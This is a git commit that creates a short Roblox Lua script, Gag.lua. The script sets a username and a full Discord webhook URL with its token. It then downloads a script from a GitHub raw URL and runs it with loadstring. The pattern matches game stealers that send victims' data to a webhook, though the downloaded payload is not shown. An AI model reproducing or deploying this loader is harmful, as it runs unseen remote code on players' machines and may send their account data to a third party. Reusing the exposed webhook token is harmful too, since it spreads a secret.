2cbfa6de08e250426195b07ee58e4232b607523c
yuunii-1 <jolyannies16@gmail.com>
2025-06-15 01:21:44 +0800

    Create Gag.lua

---
+++ Gag.lua
@@ -0,0 +1,4 @@
+Username = "Itzfreespam1"
+Webhook = "https://discord.com/api/webhooks/1382998166449688617/Py9cP5RAwZsA6uThuwAtuLapiRwdZqI8PwLBSYCnKA8d3YmeJXrWgRGpG0k8O5sFf4uh"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuunii-1/GaG/refs/heads/main/GaGs.lua"))()
